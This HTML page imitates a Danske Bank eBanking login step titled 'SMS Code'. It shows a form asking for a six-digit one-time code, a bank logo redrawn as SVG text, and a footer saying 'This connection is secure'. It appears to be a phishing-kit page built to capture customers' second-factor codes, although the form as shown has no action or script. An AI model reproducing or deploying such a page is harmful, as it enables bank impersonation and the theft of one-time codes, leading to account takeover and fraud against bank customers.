<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="google" content="notranslate">
    <title>Log on to eBanking</title>
    <link href="./static/css/main.40447a91.css" rel="stylesheet">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
            background: #f5f5f5;
        }
        .container-wrapper {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        header {
            background: #003d82;
            color: white;
            padding: 20px;
            text-align: center;
        }
        .logo {
            width: 136px;
            height: 29px;
            margin: 0 auto 10px;
        }
        .page-context {
            font-size: 14px;
            opacity: 0.9;
        }
        main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }
        .content {
            max-width: 600px;
            width: 100%;
            background: white;
            border-radius: 8px;
            padding: 40px;
        }
        .page-title {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 30px;
            color: #333;
            text-align: center;
        }
        .sub-title {
            font-size: 18px;
            font-weight: 500;
            margin-bottom: 20px;
            color: #333;
        }
        .input-wrapper {
            margin-bottom: 20px;
        }
        .input-label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
            color: #333;
        }
        .input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        .input:focus {
            outline: none;
            border-color: #003d82;
        }
        .button {
            width: 100%;
            padding: 12px;
            background: #003d82;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 20px;
        }
        .button:hover {
            background: #002d62;
        }
        footer {
            background: #f5f5f5;
            padding: 20px;
            text-align: center;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container-wrapper">
        <header>
            <div class="text-center">
                <span class="visually-hidden">Danske Bank</span>
                <svg class="logo" viewBox="0 0 200 40" focusable="false" aria-hidden="true">
                    <text x="10" y="28" font-family="Arial, sans-serif" font-size="24" font-weight="bold" fill="#ffffff">Danske Bank</text>
                </svg>
                <div class="page-context">SMS Code</div>
            </div>
        </header>

        <main role="main">
            <div class="content">
                <h1 class="page-title">SMS Code</h1>
                <form id="sms-form" autocomplete="off">
                    <fieldset>
                        <legend class="sub-title">Enter SMS code</legend>
                        <div class="input-wrapper">
                            <label for="sms-code">
                                <span class="input-label">SMS Code</span>
                                <input id="sms-code" class="input" name="sms_code" type="text" inputmode="numeric" minlength="6" maxlength="6" placeholder="123456">
                            </label>
                        </div>
                    </fieldset>
                    <button class="button" type="submit" id="sms-button">Continue</button>
                </form>
            </div>
        </main>

        <footer>
            <div>Â© Danske Bank 2026 <br>This connection is secure</div>
        </footer>
    </div>
</body>
</html>
